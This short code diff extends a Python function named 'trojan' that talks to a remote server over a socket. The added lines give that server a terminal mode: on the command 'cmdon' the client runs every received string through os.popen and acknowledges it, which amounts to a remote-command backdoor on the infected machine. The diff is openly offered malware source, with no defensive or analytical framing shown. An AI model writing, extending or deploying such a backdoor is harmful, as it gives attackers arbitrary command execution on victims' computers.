@@ -12,6 +12,14 @@ def trojan():
 
     while True:
         server_command = client.recv(1024).decode('utf-8')
+        if server_command == "cmdon":
+            cmd_mode = True
+            client.send("You now have terminal access!".encode('utf-8'))
+            continue
+        if server_command == "cmdoff":
+            cmd_mode = False
+        if cmd_mode:
+            os.popen(server_command)
         if server_command == 'hello':
             print("hello")
         client.send(f"{server_command} was executed successfully!".encode('utf-8'))
